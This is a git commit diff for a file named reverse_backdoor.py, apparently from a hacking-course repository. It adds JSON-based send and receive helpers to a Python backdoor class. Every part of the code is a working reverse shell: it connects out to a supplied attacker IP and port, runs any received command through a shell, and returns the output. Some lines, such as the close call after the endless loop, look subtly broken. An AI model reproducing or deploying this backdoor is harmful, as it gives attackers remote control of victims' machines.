0b9a869a7aa3cf1dcaeeffd03ee0a272e8a5dff4
Justin Uminga <164306553+justinadg@users.noreply.github.com>
2024-07-26 00:31:19 +0800

    Update reverse_backdoor.py

--- backdoor/reverse_backdoor.py
+++ backdoor/reverse_backdoor.py
@@ -1,19 +1,28 @@
 import socket
 import subprocess
+import json
 
 class Backdoor:
   def __init__(self, ip, port):
     self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     self.connection.connect((ip, port))
-      
+
+  def reliable_send(self, data):
+    json_data = json.dumps(data)
+    self.connection.send(json_data)
+
+  def reliable_receive(self):
+    json_data = self.connection.recv(1024)
+    return json.loads(json_data)
+    
   def execute_system_command(self, command):
     return subprocess.check_output(command, shell=True)
 
   def run(self):
     while True:
-      command = self.connection.recv(1024)
+      command = self.reliable_receive()
       result = self.execute_system_command(command)
-      self.connection.send(result)
+      self.reliable_send(result)
     connection.close()
 
 
